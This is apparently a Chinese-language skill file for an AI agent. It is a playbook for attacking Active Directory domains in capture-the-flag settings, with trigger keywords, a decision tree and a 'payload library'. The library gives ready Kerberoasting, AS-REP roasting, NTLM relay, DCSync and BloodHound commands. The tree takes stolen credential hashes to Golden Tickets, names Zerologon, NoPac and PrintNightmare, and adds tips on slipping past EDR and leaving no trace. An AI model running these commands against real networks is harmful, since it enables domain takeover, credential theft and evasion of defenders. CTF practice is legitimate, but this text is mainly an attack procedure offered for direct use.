---
description: 内网域攻击（BloodHound/Kerberoast/NTLM Relay/DCSync）
triggers: 域控, 域环境, active directory, kerberos, ntlm, dcsync, bloodhound, 域渗透, ad域, 域账户
---

# 内网域攻击

## 触发条件
目标环境有 AD 域（域控、Kerberos、SMB、LDAP），需要域渗透拿 flag。

## 决策树
1. 域侦察：BloodHound 收集攻击路径；GetNPUsers（AS-REP Roasting）、GetUserSPNs（Kerberoast）；
2. Kerberoast：拿到 TGS 票据后 hashcat 破服务账户密码；
3. NTLM Relay：ntlmrelayx 到 LDAP / ADCS（比 PtH 更有效，PtH 常被 EDR 拦）；
4. DACL 滥用：WriteDACL → 给自己加 DCSync；影子凭据（GenericWrite 即可，不改密码不留痕）；
5. DCSync：secretsdump 拿 krbtgt hash → Golden Ticket；
6. 一击致命域 CVE 优先测：Zerologon（置空 DC 机器账户密码）、NoPac、PrintNightmare。

## payload 库
- Kerberoast：`GetUserSPNs.py domain/user:pass -request` → `hashcat -m 13100`
- AS-REP：`GetNPUsers.py domain/ -usersfile users.txt -no-pass`
- DCSync：`secretsdump.py domain/user:pass@DC -just-dc`
- NTLM Relay：`ntlmrelayx.py -t ldap://DC --escalate-user`
- 域侦察：`bloodhound-python -u user -p pass -d domain -c All`

## 收尾判据
拿到域管权限 / DC 上的 flag，或到达高价值目标。
